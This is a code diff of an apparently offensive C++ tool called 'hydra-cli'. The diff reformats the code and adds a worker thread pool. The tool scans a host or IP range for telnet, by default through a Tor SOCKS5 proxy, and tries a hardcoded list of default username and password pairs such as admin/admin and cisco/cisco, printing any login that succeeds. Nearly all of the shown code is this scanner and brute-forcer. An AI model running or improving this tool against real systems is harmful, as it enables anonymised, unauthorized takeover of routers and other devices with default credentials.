@@ -4,25 +4,28 @@
 #include "./network.hpp"
 #include "./progress.hpp"
 
+#include <algorithm>
+#include <array>
+#include <atomic>
+#include <cctype>
 #include <cerrno>
 #include <chrono>
-#include <cctype>
 #include <cstring>
-#include <array>
 #include <iostream>
 #include <mutex>
 #include <string>
-#include <thread>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <thread>
 #include <unistd.h>
 #include <vector>
 
 namespace {
 
-bool send_telnet_line(int sockfd, const std::string& line) {
+bool send_telnet_line(int sockfd, const std::string &line) {
   const std::string payload = line + "\r\n";
-  return send(sockfd, payload.data(), payload.size(), 0) == static_cast<ssize_t>(payload.size());
+  return send(sockfd, payload.data(), payload.size(), 0) ==
+         static_cast<ssize_t>(payload.size());
 }
 
 std::string read_telnet_data(int sockfd) {
@@ -39,10 +42,10 @@ std::string read_telnet_data(int sockfd) {
   return collected;
 }
 
-bool response_indicates_failed_auth(const std::string& response) {
+bool response_indicates_failed_auth(const std::string &response) {
   const std::string lower_response = [&response]() {
     std::string lowered = response;
-    for (char& c : lowered) {
+    for (char &c : lowered) {
       c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
     }
     return lowered;
@@ -57,7 +60,8 @@ bool response_indicates_failed_auth(const std::string& response) {
          lower_response.find("password:") != std::string::npos;
 }
 
-bool try_telnet_auth(int sockfd, std::string& successful_username, std::string& successful_password) {
+bool try_telnet_auth(int sockfd, std::string &successful_username,
+                     std::string &successful_password) {
   const std::array<std::pair<std::string, std::string>, 12> credentials = {{
       {"admin", "admin"},
       {"admin", "password"},
@@ -73,8 +77,9 @@ bool try_telnet_auth(int sockfd, std::string& successful_username, std::string& 
       {"cisco", "cisco"},
   }};
 
-  for (const auto& [username, password] : credentials) {
-    std::cout << "[auth] trying username='" << username << "' password='" << password << "'\n";
+  for (const auto &[username, password] : credentials) {
+    std::cout << "[auth] trying username='" << username << "' password='"
+              << password << "'\n";
     read_telnet_data(sockfd);
     if (!send_telnet_line(sockfd, username)) {
       return false;
@@ -91,8 +96,8 @@ bool try_telnet_auth(int sockfd, std::string& successful_username, std::string& 
     if (!response_indicates_failed_auth(auth_response)) {
       successful_username = username;
       successful_password = password;
-      std::cout << "[auth] success username='" << successful_username << "' password='"
-                << successful_password << "'\n";
+      std::cout << "[auth] success username='" << successful_username
+                << "' password='" << successful_password << "'\n";
       return true;
     }
   }
@@ -100,9 +105,9 @@ bool try_telnet_auth(int sockfd, std::string& successful_username, std::string& 
   return false;
 }
 
-}  // namespace
+} // namespace
 
-int main(int argc, char** argv) {
+int main(int argc, char **argv) {
   log_info("hydra-cli started");
   if (argc == 2 && std::string(argv[1]) == "--help") {
     print_usage(argv[0]);
@@ -126,10 +131,15 @@ int main(int argc, char** argv) {
     targets.push_back(host_or_range);
   }
 
-  log_info("Target: " + host_or_range + ", expanded hosts: " + std::to_string(targets.size()) +
+  log_info("Target: " + host_or_range +
+           ", expanded hosts: " + std::to_string(targets.size()) +
            ", port: " + std::to_string(cli_options.target_port) +
            ", timeout: " + std::to_string(cli_options.timeout_seconds) +
-           "s, with-auth: " + (cli_options.with_auth ? "enabled" : "disabled") +
+           "s, threads: " +
+           std::to_string(cli_options.threads > 0
+                              ? cli_options.threads
+                              : static_cast<int>(targets.size())) +
+           ", with-auth: " + (cli_options.with_auth ? "enabled" : "disabled") +
            ", tor: " + (cli_options.without_tor ? "disabled" : "enabled"));
 
   int sockfd = -1;
@@ -137,58 +147,71 @@ int main(int argc, char** argv) {
   int last_error = 0;
   std::mutex connection_mutex;
   std::vector<std::thread> workers;
-  workers.reserve(targets.size());
+  const size_t requested_threads = static_cast<size_t>(
+      cli_options.threads > 0 ? cli_options.threads : targets.size());
+  const size_t worker_count = std::min(targets.size(), requested_threads);
+  workers.reserve(worker_count);
+  std::atomic<size_t> next_target_index(0);
   ProgressIndicator progress;
   progress.start(targets.size(), "checking hosts");
 
-  for (const std::string& target_host : targets) {
-    workers.emplace_back([&progress,
-                          &connection_mutex,
-                          &connected_host,
-                          &last_error,
-                          &sockfd,
-                          &target_host,
+  for (size_t worker_index = 0; worker_index < worker_count; ++worker_index) {
+    workers.emplace_back([&progress, &connection_mutex, &connected_host,
+                          &last_error, &sockfd, &targets, &next_target_index,
                           cli_options]() {
-#ifdef DEBUG
-      log_info("Trying " + target_host + ":" + std::to_string(cli_options.target_port));
-#endif
-      const int candidate_socket =
-          connect_to_host_port(target_host, cli_options.target_port, cli_options.timeout_seconds,
-                               cli_options.without_tor);
-      const int candidate_error = errno;
-
-      std::lock_guard<std::mutex> lock(connection_mutex);
-      if (candidate_socket != -1) {
-        if (sockfd == -1) {
-          sockfd = candidate_socket;
-          connected_host = target_host;
-        } else {
-          close(candidate_socket);
+      while (true) {
+        const size_t target_index = next_target_index.fetch_add(1);
+        if (target_index >= targets.size()) {
+          break;
         }
-      } else if (candidate_error != 0) {
-        last_error = candidate_error;
-      }
 
-      progress.increment();
+        const std::string &target_host = targets[target_index];
+#ifdef DEBUG
+        log_info("Trying " + target_host + ":" +
+                 std::to_string(cli_options.target_port));
+#endif
+        const int candidate_socket = connect_to_host_port(
+            target_host, cli_options.target_port, cli_options.timeout_seconds,
+            cli_options.without_tor);
+        const int candidate_error = errno;
+
+        std::lock_guard<std::mutex> lock(connection_mutex);
+        if (candidate_socket != -1) {
+          if (sockfd == -1) {
+            sockfd = candidate_socket;
+            connected_host = target_host;
+          } else {
+            close(candidate_socket);
+          }
+        } else if (candidate_error != 0) {
+          last_error = candidate_error;
+        } else {
+          last_error = ETIMEDOUT;
+        }
+
+        progress.increment();
+      }
     });
   }
 
-  for (std::thread& worker : workers) {
+  for (std::thread &worker : workers) {
     worker.join();
   }
   progress.stop("done");
 
   if (sockfd == -1) {
     errno = last_error;
-    const std::string connection_mode =
-        cli_options.without_tor ? "direct connection" : "Tor SOCKS5 proxy 127.0.0.1:9050";
-    log_error("Failed to connect to all targets in '" + host_or_range + "' using " +
-              connection_mode + " (" + std::strerror(errno) + ")");
+    const std::string connection_mode = cli_options.without_tor
+                                            ? "direct connection"
+                                            : "Tor SOCKS5 proxy 127.0.0.1:9050";
+    log_error("Failed to connect to all targets in '" + host_or_range +
+              "' using " + connection_mode + " (" + std::strerror(errno) + ")");
     return 1;
   }
 
 #ifdef DEBUG
-  log_info("Connected to " + connected_host + ":" + std::to_string(cli_options.target_port) +
+  log_info("Connected to " + connected_host + ":" +
+           std::to_string(cli_options.target_port) +
            (cli_options.without_tor ? " directly" : " through Tor"));
 #endif
 
